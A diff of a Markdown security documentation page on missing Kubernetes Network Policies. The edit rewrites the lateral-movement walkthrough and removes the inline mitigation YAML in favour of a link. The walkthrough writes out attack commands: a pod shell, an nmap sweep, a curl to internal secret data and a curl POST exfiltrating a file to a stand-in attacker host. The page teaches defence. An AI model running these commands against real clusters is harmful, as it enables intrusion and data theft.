@@ -1,139 +1,66 @@
 ---
 sidebar_position: 5
-title: Lack of Network Policies
-description: Understanding the risks of unregulated network traffic in Kubernetes and implementing best practices with Network Policies.
+title: "Lack of Network Policies"
+description: "How missing Kubernetes Network Policies enable lateral movement and data exfiltration by attackers."
 ---
 
 # Lack of Network Policies
 
-The absence of Network Policies in a Kubernetes cluster can lead to unrestricted communication between pods, allowing lateral movement and data exfiltration. Without network segmentation, an attacker who gains access to a single pod can move freely within the cluster.
+When Kubernetes clusters are deployed without Network Policies, **all pods can communicate freely with one another**. This default behavior poses a serious risk: it allows an attacker who gains access to any pod to move laterally throughout the cluster, access internal services, and exfiltrate data without restriction.
+
+This article demonstrates how a lack of network segmentation enables **lateral movement and sensitive data exposure**.
 
 ---
 
 ## Exploitation Steps: Lateral Movement in Kubernetes
 
-An attacker gains initial access to a compromised pod:
+An attacker compromises a low-privileged pod in the cluster and uses it as a pivot point.
+
+### Step 1: Gain Shell Access to the Pod
 
 ```bash
 kubectl exec -it <compromised-pod> -- /bin/sh
 ```
 
-### 1. Scan the Internal Network
+### Step 2: Discover Internal Services
 
-The attacker discovers other pods and services in the cluster using internal scanning tools:
+With unrestricted network access, the attacker installs common scanning tools to enumerate services:
 
 ```bash
 apt-get update && apt-get install -y nmap
 nmap -p 80,443,8080 10.0.0.0/24
 ```
 
-### 2. Access Sensitive Services
+### Step 3: Access Unprotected Services
 
-The attacker can connect to open services in other pods, such as databases or APIs:
+After identifying service IPs, the attacker connects to internal APIs or databases directly:
 
 ```bash
 curl http://10.0.0.15:8080/secret-data
 ```
 
-### 3. Exfiltrate Data to an External Server
+### Step 4: Exfiltrate Data
 
-The attacker sends sensitive data to an external server using a simple HTTP request:
+Sensitive information is sent outside the cluster via an outbound HTTP request:
 
 ```bash
-curl -X POST -d @/path/to/secret-data http://attacker-server.com/upload
-```
-
-### Result
-
-The attacker can move laterally within the cluster, access sensitive data, and exfiltrate information without network restrictions.
-
----
-
-## Mitigation Techniques and Fixes
-
-### 1. Implement Default Deny Policies
-
-**Issue:** By default, all pods can communicate with each other, creating security risks.<br/>
-**Fix:** Apply a default deny policy to block all traffic by default.
-
-#### Example of Default Deny Policy for Ingress and Egress
-
-```yaml
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
-metadata:
-  name: default-deny-all
-  namespace: default
-spec:
-  podSelector: {}
-  policyTypes:
-    - Ingress
-    - Egress
-```
-
-### 2. Create Allow-Only Policies
-
-**Issue:** Lack of specific allow rules means that unwanted traffic is not blocked.<br/>
-**Fix:** Use Network Policies to allow traffic only to specific pods or services.
-
-#### Example Allowing Traffic Only to an Application Pod
-
-```yaml
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
-metadata:
-  name: allow-app-traffic
-  namespace: default
-spec:
-  podSelector:
-    matchLabels:
-      app: my-app
-  policyTypes:
-    - Ingress
-  ingress:
-    - from:
-        - podSelector:
-            matchLabels:
-              role: frontend
-      ports:
-        - protocol: TCP
-          port: 80
-```
-
-### 3. Restrict Egress Traffic
-
-**Issue:** Unrestricted outgoing traffic can leak sensitive data to external servers.<br/>
-**Fix:** Define egress rules to control outbound connections.
-
-#### Example Egress Policy Allowing Only Specific Destinations
-
-```yaml
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
-metadata:
-  name: restrict-egress
-  namespace: default
-spec:
-  podSelector:
-    matchLabels:
-      role: database
-  policyTypes:
-    - Egress
-  egress:
-    - to:
-        - ipBlock:
-            cidr: 10.0.0.0/24
-      ports:
-        - protocol: TCP
-          port: 5432
+curl -X POST -d @/path/to/secret-data http://attacker.com/upload
 ```
 
 ---
 
-## Conclusion
+## Result
 
-To enhance security and limit lateral movement within the Kubernetes cluster:
+Without any Network Policies in place:
 
-- Implement default deny policies for ingress and egress traffic.
-- Create specific allow rules using Network Policies.
-- Regularly audit and validate network policies to ensure only necessary communication is allowed.
+- Lateral movement goes **unrestricted**.
+- Internal services are **exposed** across the cluster.
+- Data can be **exfiltrated externally** without detection or limitation.
+
+---
+
+## Mitigation
+
+To prevent lateral movement and reduce your cluster's attack surface:
+
+➡ [Harden your cluster with Kubernetes Network Policies](/docs/best_practices/cluster_setup_and_hardening/network_security/network_policies)
